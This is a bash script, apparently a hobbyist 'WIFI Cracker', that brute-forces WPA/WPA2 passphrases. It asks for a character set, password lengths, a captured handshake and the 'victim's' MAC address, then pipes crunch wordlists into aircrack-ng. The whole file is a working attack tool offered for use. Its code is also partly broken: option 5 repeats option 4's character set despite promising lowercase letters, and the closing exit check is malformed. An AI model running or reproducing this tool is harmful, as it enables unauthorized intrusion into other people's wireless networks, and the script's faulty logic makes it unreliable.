#!/bin/bash
echo "##############################################################"
echo "#####################                #########################"
echo "#####################  WIFI Cracker  #########################" 
echo "#####################                #########################"
echo "##############################################################"
echo "WIFI WPA/WPA2 CRACKER,loading...."

sleep 3
read -p "You nedd to crack using :
 1)numbers just 
 2)small_letters just 
 3)numbers+small_letters
 4)numbers+capital_letters
 5)numbers+capital+small_letters
 : " Type
if [ $Type -eq 3 ] 
then
echo "This script crack numbers+small_letters"
read -p "what is the minimum number you choose: " Min
read -p "What is the maximum number you choose: " Max
read -p "Whats your Vicims handshake: " Handshake
read -p "Whats your Visims Mac-adress: " Mac
sleep 2 
crunch $Min $Max abcdefghijklmnopqrstuvwxyz9876543210 | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $Type -eq 1 ]
then 
echo "This script for crack wpa-wpa2 using just numbers"
sleep 3
read -p "what is the minimum number you choose: " Min
read -p "what is the maximum number you choose: " Max
read -p "put your handshake: " Handshake
read -p "put your visim Mac adress: " Mac
sleep 2 
crunch $Min $Max 0123456789 | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $Type -eq 2 ]
then
echo "this script for crack wpa-wpa2 using small_letters just"
sleep 3
read -p "what is the minimum number you choose: " Min
read -p "what is the maximum number you choose: " Max
read -p "put your handshake: " Handshake
read -p "put your visim Mac adress: " Mac
sleep 2 
crunch $Min $Max abcdefghijklmnopqrstuvwxyz | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $Type -eq 4 ] 
then
echo "This script crack wpa2-wpa using numbers+capital_letters"
read -p "Whast is the minimum number you choose: " Min
read -p "Whats is the maximum number you choose: " Max
read -p "Whats your Vicims handshake: " Handshake
read -p "Whats your Visims Mac-adress: " Mac
sleep 2
crunch $Min $Max ABCDEFGHIJKLMNOPQRSTUVWXYZ9876543210 | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $Type -eq 5 ] 
then
echo "This script crack wpa2-wpa using numbers+capital+small_letters"
read -p "Whas is the minimum number you choose: " Min
read -p "What is the maximum number you choose: " Max
read -p "Whats your Vicims handshake: " Handshake
read -p "Whats your Visims Mac-adress: " Mac
sleep 2
crunch $Min $Max ABCDEFGHIJKLMNOPQRSTUVWXYZ9876543210 | aircrack-ng -a2 $Handshake -b $Mac -w-
fi
if [ $? -eq 0 -a 1 ]
then
echo''
echo "##############################################################"
echo "#####################                #########################"
echo "#####################  END OF SCRIPT #########################" 
echo "#####################                #########################"
echo "##############################################################"
echo "This Script done by Ahmad Jawabreh"
echo "Have a nice day :)"
echo "GoodBye"
exit
fi

